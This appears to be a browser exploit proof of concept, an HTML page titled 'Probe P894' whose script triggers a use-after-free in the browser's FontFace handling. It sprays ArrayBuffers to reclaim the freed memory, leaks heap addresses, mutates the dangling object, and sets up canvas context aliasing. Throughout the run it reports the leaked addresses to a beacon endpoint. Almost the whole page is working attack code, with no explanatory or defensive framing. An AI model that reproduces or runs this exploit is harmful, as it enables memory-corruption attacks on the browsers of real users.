<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P894: Direct uafFace Wrapper Hooking & In-Place Mutation</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P894...</div>
<h2>P894: Direct uafFace Wrapper Hooking & In-Place Mutation</h2>
<pre id="log">Initializing diagnostic probe P894...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P894-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function hex64(dv, off) {
  var lo = dv.getUint32(off, true);
  var hi = dv.getUint32(off + 4, true);
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P894 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Create CSS Rule & Pre-Capture uafFace Wrapper
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);
document.body.offsetHeight; // force style parse

var uafFace = null;
try {
  document.fonts.forEach(function(f) {
    if (f.family === 'bb1' || f.family === '"bb1"') {
      uafFace = f;
    }
  });
} catch(e) {}

var preFound = (uafFace !== null);
log('[+] Phase 1: CSS bb1 Rule Injected | uafFace Pre-Captured: ' + preFound, preFound ? 'ok' : 'fail');

/* ============================================================
 * PHASE 2: FontFace UAF Trigger (Frees the CSS bb1 CSSFontFace)
 * ============================================================ */
var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var fontDV = null;

  if (bestI >= 0 && bestNz >= 4) {
    fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
  }

  var delta = 0;
  if (H_hi !== 0 && q13hi !== 0 && H_hi === q13hi) {
    delta = H_lo - q13lo;
  }

  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * PHASE 3: Direct Mutation via uafFace across fabs[bestI]
   * ============================================================ */
  var diffReport = 'none';
  var mutateOk = false;

  if (uafFace && fontDV) {
    // Snapshot fabs[bestI] before
    var snapBefore = new Uint8Array(fabs[bestI]).slice();

    try {
      // In-place mutation of the dangling object!
      uafFace.weight = 'bold';
      uafFace.style = 'italic';
      mutateOk = true;
    } catch(e) {
      diffReport = 'err:' + e.message;
    }

    // Snapshot after
    var snapAfter = new Uint8Array(fabs[bestI]);
    var changed = [];
    for (var b = 0; b < 192; b++) {
      if (snapBefore[b] !== snapAfter[b]) {
        changed.push('0x' + b.toString(16) + ':' + snapBefore[b].toString(16) + '->' + snapAfter[b].toString(16));
      }
    }
    if (changed.length > 0) {
      diffReport = changed.join(',');
    }
  }

  log('[+] Phase 3: uafFace In-Place Mutation: mutateOk=' + mutateOk + ' | diffs=' + diffReport, changed && changed.length > 0 ? 'hot' : 'info');
  syncBn('UAFFACE-MUTATE', 'preFound=' + preFound + '|mutateOk=' + mutateOk + '|diffCount=' + (changed ? changed.length : 0) + '|diffs=' + diffReport.slice(0, 500));

  /* ============================================================
   * PHASE 4: Canvas Aliasing State
   * ============================================================ */
  var c1 = document.createElement('canvas');
  c1.width = 16; c1.height = 16;
  var innerCtx1 = null;
  var opts1 = {};
  Object.defineProperty(opts1, 'alpha', {
    get: function() { innerCtx1 = c1.getContext('2d'); return true; }
  });
  c1.getContext('bitmaprenderer', opts1);

  var sprayCtxs = [];
  for (var s = 0; s < 100; s++) {
    var c = document.createElement('canvas');
    c.width = 16; c.height = 16;
    var ctx = c.getContext('2d');
    ctx.lineWidth = 2000.0 + s;
    sprayCtxs.push(ctx);
  }

  var idx1 = -1;
  try {
    var lw1 = innerCtx1.lineWidth;
    if (lw1 >= 2000.0 && lw1 < 2100.0) idx1 = Math.round(lw1 - 2000.0);
  } catch(e) {}

  log('[+] Phase 4: Canvas Alias: #' + idx1, 'ok');

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P894 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P894 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - uafFace Hook: preFound=' + preFound + ', mutateOk=' + mutateOk + ' (diffs: ' + diffReport + ')', 'hot');
  log('    - Canvas Alias: #' + idx1, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|preFound=' + preFound + '|mutateOk=' + mutateOk + '|diffs=' + diffReport.slice(0, 300) + '|idx1=' + idx1);

}, 400);
</script>
</body>
</html>
